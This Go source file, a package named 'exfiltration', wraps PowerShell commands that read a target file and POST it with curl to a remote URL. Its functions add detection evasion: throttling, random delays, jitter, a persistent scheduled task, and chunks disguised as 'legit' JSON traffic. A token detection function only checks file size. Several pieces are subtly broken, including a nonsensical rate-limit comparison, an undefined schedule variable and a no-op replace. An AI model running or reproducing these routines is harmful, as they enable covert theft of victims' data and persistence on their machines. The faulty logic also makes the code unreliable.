package exfiltration

import (
	"fmt"
	"os/exec"
)

func ExfilRateLimit(dataFile, remoteURL, bytesPerSecond string) (string, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`$lim=[double]'%s';$data=[IO.File]::ReadAllBytes('%s');$sw=[Diagnostics.Stopwatch]::StartNew();foreach($b in $data){curl -X POST -d ([char]$b) '%s';$elapsed=$sw.Elapsed.TotalSeconds;$expected=(($sw.Elapsed.Ticks/10000000)*$lim);if($b -gt $expected){Start-Sleep -Milliseconds ((($b-$expected)/$lim)*1000)}}`,
			bytesPerSecond, dataFile, remoteURL))
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func ExfilRandomDelay(dataFile, remoteURL, minDelay, maxDelay string) (string, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`$r=[Random]::new();$data=[Convert]::ToBase64String([IO.File]::ReadAllBytes('%s'));$chunks=$data-replace'(.{100})','$1 ';foreach($c in ($chunks-split' ')){curl -X POST -d $c '%s';Start-Sleep -Milliseconds $r.Next(%s,%s)}`,
			dataFile, remoteURL, minDelay, maxDelay))
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func ExfilViaJitter(dataFile, remoteURL, jitterPercent string) (string, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`$j=[double]'%s';$base=500;$r=[Random]::new();$data=[Convert]::ToBase64String([IO.File]::ReadAllBytes('%s'));$chunks=$data-replace'(.{100})','$1 ';foreach($c in ($chunks-split' ')){curl -X POST -d $c '%s';$jitter=$base*($r.NextDouble()*2-1)*$j/100;Start-Sleep -Milliseconds([Math]::Max(0,$base+$jitter))}`,
			jitterPercent, dataFile, remoteURL))
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func ExfilViaSchedule(dataFile, remoteURL, cronExpr string) (string, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`$action=New-ScheduledTaskAction -Execute 'powershell' -Argument "curl -X POST -d @'%s' '%s'";$trigger=New-ScheduledTaskTrigger -Daily -At $cronExpr;Register-ScheduledTask -TaskName 'ExfilTask' -Action $action -Trigger $trigger -Force`,
			dataFile, remoteURL))
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func ExfilCoverChannels(targetURL, dataFile string) (string, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`$data=[Convert]::ToBase64String([IO.File]::ReadAllBytes('%s'));for($i=0;$i -lt [Math]::Ceiling($data.Length/100);$i++){$chunk=$data.Substring($i*100,[Math]::Min(100,$data.Length-$i*100));$payload=@{};$payload.legit=$true;$payload.id=$i;$payload.d=($chunk-replace'.','.');curl -X POST -H 'Content-Type: application/json' -d ($payload|ConvertTo-Json) '%s';Start-Sleep -Seconds 5}`,
			dataFile, targetURL))
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func DetectExfilAttempt(dataFile string) (string, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`$f=Get-Item '%s';$sz=$f.Length;$con=Get-Content '%s' -Raw;$base64=$con-match'^[A-Za-z0-9+/]*={0,2}$';$highEntropy=$false;if($sz -gt 10485760){'WARN: File >10MB likely detected'}`,
			dataFile, dataFile))
	out, err := cmd.CombinedOutput()
	return string(out), err
}
